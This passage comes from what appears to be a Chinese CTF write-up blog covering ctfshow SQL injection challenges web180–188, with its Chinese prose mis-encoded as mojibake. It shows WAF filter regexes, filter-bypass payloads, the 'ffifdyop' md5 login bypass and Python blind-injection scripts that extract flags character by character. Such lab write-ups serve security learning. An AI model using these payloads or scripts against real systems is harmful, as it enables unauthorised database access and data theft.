title="web180"></a>web180</h4><p>æœ¬é¢˜åœ¨ä¸Šä¸€é¢˜çš„åŸºç¡€ä¸Šå°†%23ä¹Ÿè¿‡æ»¤äº†ï¼Œçœ‹äº†ä¸‹å…¶ä»–å¸ˆå‚…ä»¬çš„åšå®¢ï¼Œæ˜¯è¿›è¡Œæ‹¼æ¥sqlè¯­å¥æ‹¿åˆ°flagçš„</p><p>payloadï¼š</p><pre class="line-numbers language-none"><code class="language-none">-1&#39;or(username&#x3D;&#39;flag&#39;)and&#39;1&#x3D;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ­¤æ—¶å®Œæ•´çš„sqlè¯­å¥ä¸º:</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">$<span class="token keyword">sql</span> <span class="token operator">=</span> <span class="token string">"select id,username,password from ctfshow_user where username !='flag' and id = '-1'or(username='flag')and'1=1' limit 1;"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å› ä¸ºandçš„ä¼˜å…ˆçº§é«˜äºorï¼Œæ‰€ä»¥ä¼šå…ˆè¿›è¡Œåé¢çš„ä¸è¿ç®—(username=â€™flagâ€™)andâ€™1=1â€™ï¼Œä¸ºçœŸï¼›å†ä¸-1è¿›è¡Œæˆ–è¿ç®—ï¼Œå¾—åˆ°çš„ç»“æœä¹Ÿä¸ºçœŸï¼Œæ‰€ä»¥æ•´ä¸ªæ¡ä»¶ä¹Ÿå°±ä¸ºçœŸï¼Œæ‹¿åˆ°flag</p><h4 id="web181"><a href="#web181" class="headerlink" title="web181"></a>web181</h4><p>ç»ˆäºå¯ä»¥çœ‹è§è¿‡æ»¤çš„å‚æ•°äº†</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function-definition function">waf</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/ |\*|\x09|\x0a|\x0b|\x0c|\x00|\x0d|\xa0|\x23|\#|file|into|select/i'</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>ä½†æˆ‘ä»¬ä¾æ—§å¯ä»¥æ‹¿å»180çš„payloadè¿›è¡Œç»•è¿‡</p><pre class="line-numbers language-none"><code class="language-none">-1&#39;or(username&#x3D;&#39;flag&#39;)and&#39;1&#x3D;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ‹¿åˆ°flag</p><h4 id="web182"><a href="#web182" class="headerlink" title="web182"></a>web182</h4><pre class="line-numbers language-none"><code class="language-none">function waf($str)&#123;    return preg_match(&#39;&#x2F; |\*|\x09|\x0a|\x0b|\x0c|\x00|\x0d|\xa0|\x23|\#|file|into|select|flag&#x2F;i&#39;, $str);  &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>ç›¸æ¯”ä¸Šä¸€é¢˜ï¼Œè¿™é¢˜åˆå¤šè¿‡æ»¤äº†flagå­—ç¬¦ä¸²ï¼Œæ‰€ä»¥åªéœ€å°†ä¸Šä¸€é¢˜çš„payloadä¿®æ”¹ä»¥ä¸‹å³å¯ï¼ˆå› ä¸ºçŸ¥é“flagçš„idä¸º26ï¼‰ï¼š</p><pre class="line-numbers language-none"><code class="language-none">-1&#39;or(id&#x3D;26)and&#39;1&#x3D;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="web183"><a href="#web183" class="headerlink" title="web183"></a>web183</h4><pre class="line-numbers language-none"><code class="language-none">function waf($str)&#123;    return preg_match(&#39;&#x2F; |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\#|\x23|file|\&#x3D;|or|\x7c|select|and|flag|into&#x2F;i&#39;, $str);  &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>å…ˆæ ¹æ®å®ƒç»™çš„æŸ¥è¯¢è¯­å¥ï¼Œpostï¼štableName=ctfshow_userï¼Œç„¶åå‘ç°$user_count = 22ï¼Œè¯´æ˜æ€»å…±æœ‰22æ¡æ•°æ®</p><p>å› ä¸ºorå’Œandç­‰éƒ½è¢«è¿‡æ»¤äº†ï¼Œäºæ˜¯æƒ³åˆ°äº†è¿˜æœ‰likeï¼Œæ„é€ payloadï¼š</p><pre class="line-numbers language-none"><code class="language-none">postlï¼štableName&#x3D;(ctfshow_user)where(pass)like&#39;ctfshow%25&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å‘ç°æ­¤æ—¶$user_count = 1ï¼Œäºæ˜¯å¯ä»¥é€šè¿‡åˆ¤æ–­$user_count æ˜¯å¦ä¸º1çš„æ–¹å¼æ¥å¯¹è¿›è¡Œç›²æ³¨</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"http://cf291130-ee20-4e3f-b82b-38f96f53ba36.challenge.ctf.show/select-waf.php"</span><span class="token builtin">dict</span> <span class="token operator">=</span> <span class="token string">"&#123;&#125;-1234567890qwertyuiopasdfghjklzxcvbnm"</span>flag <span class="token operator">=</span> <span class="token string">"ctfshow"</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">55</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">dict</span><span class="token punctuation">:</span>        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"tableName"</span><span class="token punctuation">:</span> <span class="token string">"(ctfshow_user)where(pass)like'&#123;0&#125;%'"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>flag<span class="token operator">+</span>j<span class="token punctuation">)</span><span class="token punctuation">&#125;</span>        res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span>        <span class="token comment">#print(res.status_code)</span>        <span class="token keyword">if</span> <span class="token string">"$user_count = 1"</span> <span class="token keyword">in</span> res<span class="token punctuation">.</span>text<span class="token punctuation">:</span>            flag <span class="token operator">=</span> flag <span class="token operator">+</span> j            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>            <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ‹¿åˆ°flag</p><h4 id="web184"><a href="#web184" class="headerlink" title="web184"></a>web184</h4><pre class="line-numbers language-none"><code class="language-none">function waf($str)&#123;    return preg_match(&#39;&#x2F;\*|\x09|\x0a|\x0b|\x0c|\0x0d|\xa0|\x00|\#|\x23|file|\&#x3D;|or|\x7c|select|and|flag|into|where|\x26|\&#39;|\&quot;|union|\&#96;|sleep|benchmark&#x2F;i&#39;, $str);  &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>è¿™é¢˜åœ¨ä¸Šä¸€é¢˜çš„åŸºç¡€ä¸Šå°†whereåˆè¿‡æ»¤äº†ï¼Œä½†è¿˜å¯ç”¨having</p><p>having å­å¥çš„ä½œç”¨æ˜¯ç­›é€‰æ»¡è¶³æ¡ä»¶çš„ç»„ï¼Œå³åœ¨åˆ†ç»„ä¹‹åè¿‡æ»¤æ•°æ®ï¼Œæ¡ä»¶ä¸­ç»å¸¸åŒ…å«èšç»„å‡½æ•°ï¼Œä½¿ç”¨having æ¡ä»¶æ˜¾ç¤ºç‰¹å®šçš„ç»„ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨å¤šä¸ªåˆ†ç»„æ ‡å‡†è¿›è¡Œåˆ†ç»„ã€‚ ä¸ where å’Œselectçš„äº¤äº’æ–¹å¼ç±»ä¼¼ã€‚whereæœç´¢æ¡ä»¶åœ¨è¿›è¡Œåˆ†ç»„æ“ä½œä¹‹å‰åº”ç”¨ï¼›è€Œhavingæœç´¢æ¡ä»¶åœ¨è¿›è¡Œåˆ†ç»„æ“ä½œä¹‹ååº”ç”¨ã€‚</p><p>åŒæ—¶ä¹Ÿéœ€è¦å°†ctfshow%è¿›è¡Œ16è¿›åˆ¶ç¼–ç ï¼š</p><pre class="line-numbers language-none"><code class="language-none">ctfshowï¼š0x63746673686f7725postï¼štableName&#x3D;ctfshow_user group by pass having pass like 0x63746673686f7725<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>å¯ä»¥å†æ¬¡å‘ç°$user_count = 1;åªéœ€åœ¨ä¸Šä¸€é¢˜çš„è„šæœ¬ä¸Šè¿›è¡Œä¸€äº›ä¿®æ”¹å³å¯</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> timeurl <span class="token operator">=</span> <span class="token string">"http://1adbebff-1c42-4d35-aa92-3133b7badd18.challenge.ctf.show/select-waf.php"</span><span class="token builtin">dict</span> <span class="token operator">=</span> <span class="token string">"&#123;&#125;-1234567890qwertyuiopasdfghjklzxcvbnm"</span>flag <span class="token operator">=</span> <span class="token string">"ctfshow"</span><span class="token keyword">def</span> <span class="token function">str2hex</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    a <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">str</span><span class="token punctuation">:</span>        a <span class="token operator">=</span> a <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> a<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"0x"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">55</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">dict</span><span class="token punctuation">:</span>        str1 <span class="token operator">=</span> <span class="token string">"0x"</span> <span class="token operator">+</span> str2hex<span class="token punctuation">(</span>flag <span class="token operator">+</span> j <span class="token operator">+</span> <span class="token string">"%"</span><span class="token punctuation">)</span>        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"tableName"</span><span class="token punctuation">:</span> <span class="token string">"ctfshow_user group by pass having pass like &#123;0&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>str1<span class="token punctuation">)</span><span class="token punctuation">&#125;</span>        <span class="token comment">#print(data)</span>        res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span>        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.3</span><span class="token punctuation">)</span>        <span class="token comment">#print(res.text)</span>        <span class="token keyword">if</span> <span class="token string">"$user_count = 1;"</span> <span class="token keyword">in</span> res<span class="token punctuation">.</span>text<span class="token punctuation">:</span>            flag <span class="token operator">=</span> flag <span class="token operator">+</span> j            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>            <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ‹¿åˆ°flag</p><h4 id="web185"><a href="#web185" class="headerlink" title="web185"></a>web185</h4><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function-definition function">waf</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/\*|\x09|\x0a|\x0b|\x0c|\0x0d|\xa0|\x00|\#|\x23|[0-9]|file|\=|or|\x7c|select|and|flag|into|where|\x26|\'|\"|union|\`|sleep|benchmark/i'</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>è¿™ä¸€æ¬¡å°†æ•°å­—ä¹Ÿè¿›è¡Œäº†è¿‡æ»¤ï¼Œå†æ¬¡å¡ä½äº†ï¼Œçœ‹äº†å…¶ä»–å¸ˆå‚…ä»¬çš„åšå®¢å’Œç¾¤ä¸»çš„è§†é¢‘æ‰çŸ¥é“å¯ä»¥åˆ©ç”¨å­—ç¬¦æ¥æ„é€ æ•°å­—ï¼Œåœ¨mysqlä¸­å¯ä»¥çŸ¥é“æ˜¯true=1ï¼Œtrue+true=2ï¼Œé‚£ä¹ˆé€šè¿‡ç›¸åŠ ä¾¿å¯ä»¥æ„é€ å‡ºä»»æ„çš„æ•°å­—ï¼ŒåŒæ—¶å¯ä»¥é€šè¿‡concatæ¥è¿æ¥å­—æ¯</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> concat<span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span>  <span class="token operator">=</span><span class="token operator">></span>  <span class="token number">1</span><span class="token keyword">select</span> concat<span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">,</span><span class="token boolean">true</span><span class="token punctuation">)</span>  <span class="token operator">=</span><span class="token operator">></span>  <span class="token number">11</span><span class="token keyword">select</span> concat<span class="token punctuation">(</span><span class="token boolean">true</span><span class="token operator">+</span><span class="token boolean">true</span><span class="token punctuation">,</span><span class="token boolean">true</span><span class="token operator">+</span><span class="token boolean">true</span><span class="token punctuation">)</span>  <span class="token operator">=</span><span class="token operator">></span>  <span class="token number">22</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ‰€ä»¥ç»§ç»­ä¸Šä¸€é¢˜çš„è„šæœ¬ï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> timeurl <span class="token operator">=</span> <span class="token string">"http://4e79aa3a-008f-4736-bf6f-12462a1fa7be.challenge.ctf.show/select-waf.php"</span><span class="token builtin">dict</span> <span class="token operator">=</span> <span class="token string">"&#123;&#125;-1234567890qwertyuiopasdfghjklzxcvbnm"</span>flag <span class="token operator">=</span> <span class="token string">"ctfshow"</span><span class="token keyword">def</span> <span class="token function">str_to_hex</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    a <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">str</span><span class="token punctuation">:</span>        a <span class="token operator">=</span> a <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> a<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"0x"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">char_to_boolean</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    num <span class="token operator">=</span> <span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">)</span>    temp <span class="token operator">=</span> <span class="token string">"char("</span>    <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">:</span>        temp <span class="token operator">=</span> temp <span class="token operator">+</span> <span class="token string">"true+"</span>    <span class="token keyword">return</span> temp<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">"),"</span><span class="token keyword">def</span> <span class="token function">formatstr</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    temp <span class="token operator">=</span> <span class="token string">"concat("</span>    <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">str</span><span class="token punctuation">:</span>        temp <span class="token operator">=</span> temp <span class="token operator">+</span> char_to_boolean<span class="token punctuation">(</span>x<span class="token punctuation">)</span>    <span class="token keyword">return</span> temp<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">")"</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">55</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">dict</span><span class="token punctuation">:</span>        str1 <span class="token operator">=</span>formatstr<span class="token punctuation">(</span>flag <span class="token operator">+</span> j <span class="token operator">+</span> <span class="token string">"%"</span><span class="token punctuation">)</span>        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"tableName"</span><span class="token punctuation">:</span> <span class="token string">"ctfshow_user group by pass having pass like &#123;0&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>str1<span class="token punctuation">)</span><span class="token punctuation">&#125;</span>        <span class="token comment">#print(data)</span>        res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span>        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.3</span><span class="token punctuation">)</span>        <span class="token comment">#print(res.text)</span>        <span class="token keyword">if</span> <span class="token string">"$user_count = 1;"</span> <span class="token keyword">in</span> res<span class="token punctuation">.</span>text<span class="token punctuation">:</span>            flag <span class="token operator">=</span> flag <span class="token operator">+</span> j            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>            <span class="token keyword">break</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"+++++++++wrong"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ‹¿åˆ°flag</p><h4 id="web186"><a href="#web186" class="headerlink" title="web186"></a>web186</h4><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function-definition function">waf</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/\*|\x09|\x0a|\x0b|\x0c|\0x0d|\xa0|\%|\&lt;|\>|\^|\x00|\#|\x23|[0-9]|file|\=|or|\x7c|select|and|flag|into|where|\x26|\'|\"|union|\`|sleep|benchmark/i'</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>è™½ç„¶åœ¨ä¸Šä¸€é¢˜çš„åŸºç¡€ä¸Šåˆå¤šå¢åŠ äº†ä¸€äº›è¿‡æ»¤ï¼Œä½†å‘ç°å¯¹ä¸Šä¸€é¢˜çš„payloadä¾æ—§æ— å½±å“ï¼Œç»§ç»­ä½¿ç”¨ä¸Šä¸€é¢˜çš„è„šæœ¬</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> timeurl <span class="token operator">=</span> <span class="token string">"http://f4fd7dc1-141f-4500-a159-e5e7be85d477.challenge.ctf.show/select-waf.php"</span><span class="token builtin">dict</span> <span class="token operator">=</span> <span class="token string">"&#123;&#125;-1234567890qwertyuiopasdfghjklzxcvbnm"</span>flag <span class="token operator">=</span> <span class="token string">"ctfshow"</span><span class="token keyword">def</span> <span class="token function">str_to_hex</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    a <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">str</span><span class="token punctuation">:</span>        a <span class="token operator">=</span> a <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> a<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"0x"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">char_to_boolean</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    num <span class="token operator">=</span> <span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">)</span>    temp <span class="token operator">=</span> <span class="token string">"char("</span>    <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">:</span>        temp <span class="token operator">=</span> temp <span class="token operator">+</span> <span class="token string">"true+"</span>    <span class="token keyword">return</span> temp<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">"),"</span><span class="token keyword">def</span> <span class="token function">formatstr</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    temp <span class="token operator">=</span> <span class="token string">"concat("</span>    <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">str</span><span class="token punctuation">:</span>        temp <span class="token operator">=</span> temp <span class="token operator">+</span> char_to_boolean<span class="token punctuation">(</span>x<span class="token punctuation">)</span>    <span class="token keyword">return</span> temp<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">")"</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">55</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">dict</span><span class="token punctuation">:</span>        str1 <span class="token operator">=</span>formatstr<span class="token punctuation">(</span>flag <span class="token operator">+</span> j <span class="token operator">+</span> <span class="token string">"%"</span><span class="token punctuation">)</span>        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"tableName"</span><span class="token punctuation">:</span> <span class="token string">"ctfshow_user group by pass having pass like &#123;0&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>str1<span class="token punctuation">)</span><span class="token punctuation">&#125;</span>        <span class="token comment">#print(data)</span>        res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span>        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.3</span><span class="token punctuation">)</span>        <span class="token comment">#print(res.text)</span>        <span class="token keyword">if</span> <span class="token string">"$user_count = 1;"</span> <span class="token keyword">in</span> res<span class="token punctuation">.</span>text<span class="token punctuation">:</span>            flag <span class="token operator">=</span> flag <span class="token operator">+</span> j            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>            <span class="token keyword">break</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"+++++++++wrong"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ‹¿åˆ°flag</p><h4 id="web187"><a href="#web187" class="headerlink" title="web187"></a>web187</h4><p>è¿™ä¸€æ¬¡æ˜¯æœ‰ç™»å½•æ¡†çš„äº†</p><p>è¿”å›é€»è¾‘</p><pre class="line-numbers language-none"><code class="language-none">$username &#x3D; $_POST[&#39;username&#39;];$password &#x3D; md5($_POST[&#39;password&#39;],true);&#x2F;&#x2F;åªæœ‰adminå¯ä»¥è·å¾—flagif($username!&#x3D;&#39;admin&#39;)&#123;    $ret[&#39;msg&#39;]&#x3D;&#39;ç”¨æˆ·åä¸å­˜åœ¨&#39;;    die(json_encode($ret));&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¯ä»¥çœ‹åˆ°passwordæ˜¯ç»è¿‡äº†md5åŠ å¯†çš„ï¼ŒåŒæ—¶å› ä¸ºç¬¬äºŒä¸ªå‚æ•°ä¸ºtrueï¼Œæ‰€ä»¥è¿”å›çš„æ˜¯ä¸€ä¸ª16ä½äºŒè¿›åˆ¶ï¼Œ</p><p>è€Œæœ‰ä¸€ä¸ªç‰¹æ®Šçš„å­—ç¬¦ä¸²ffifdyopï¼Œç»è¿‡ md5(â€œffifdyopâ€,true); è¿”å›çš„æ˜¯â€™orâ€™ 6(åé¢æ˜¯ä¸€äº›ä¸å¯è§å­—ç¬¦)ï¼ŒæˆåŠŸä½œä¸ºäº†ä¸€ä¸ªä¸‡èƒ½å¯†ç ï¼Œè¾“å…¥æäº¤åï¼Œåœ¨è¿”å›åŒ…ä¸­æ‹¿åˆ°äº†flag</p><h4 id="web-188"><a href="#web-188" class="headerlink" title="web_188"></a>web_188</h4><pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F;æ‹¼æ¥sqlè¯­å¥æŸ¥æ‰¾æŒ‡å®šIDç”¨æˆ· $sql &#x3D; &quot;select pass from ctfshow_user where username &#x3D; &#123;$username&#125;&quot;;     <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>è¿”å›é€»è¾‘</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F;ç”¨æˆ·åæ£€æµ‹if(preg_match(&#39;&#x2F;and|or|select|from|where|union|join|sleep|benchmark|,|\(|\)|\&#39;|\&quot;&#x2F;i&#39;, $username))&#123;  $ret[&#39;msg&#39;]&#x3D;&#39;ç”¨æˆ·åéæ³•&#39;;  die(json_encode($ret));&#125;&#x2F;&#x2F;å¯†ç æ£€æµ‹if(!is_numeric($password))&#123;  $ret[&#39;msg&#39;]&#x3D;&#39;å¯†ç åªèƒ½ä¸ºæ•°å­—&#39;;  die(json_encode($ret));&#125;&#x2F;&#x2F;å¯†ç åˆ¤æ–­if($row[&#39;pass&#39;]&#x3D;&#x3D;intval($password))&#123;    $ret[&#39;msg&#39;]&#x3D;&#39;ç™»é™†æˆåŠŸ&#39;;    array_push($ret[&#39;data&#39;], array(&#39;flag&#39;&#x3D;&gt;$flag));  &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å…ˆçœ‹åˆ°çš„æ˜¯sqlè¯­å¥æ˜¯é€šè¿‡æ£€ç´¢usernameæ¥æŸ¥è¯¢passçš„ï¼Œè€Œåœ¨sqlè¯­å¥ä¸­æ£€ç´¢æ—¶ä¸ºå¼±æ¯”è¾ƒï¼Œå¦‚æœä»¤username=0ï¼Œé‚£ä¹ˆåªè¦æ˜¯usernameå­—æ®µé‡Œçš„å†…å®¹æ˜¯ä»¥é¦–å­—æ¯å¼€å¤´çš„ï¼Œé‚£ä¹ˆä¹Ÿå°±ä¼šè¢«å¼ºåˆ¶è½¬åŒ–ä¸º0ï¼Œä»è€Œè¾¾åˆ°0=0ï¼›å†æ¥çœ‹åˆ°å¯†ç åˆ¤æ–­è¿™é‡Œï¼Œä¹Ÿæ˜¯ä¸€ä¸ªå¼±æ¯”è¾ƒï¼Œä»¤passwordä¸º0ï¼Œé‚£ä¹ˆåŒç†å¯å¾—ï¼Œç»•è¿‡äº†ifåˆ¤æ–­è¯­å¥ï¼Œæœ¬åœ°æµ‹è¯•ä»¥ä¸‹:</p><p><img 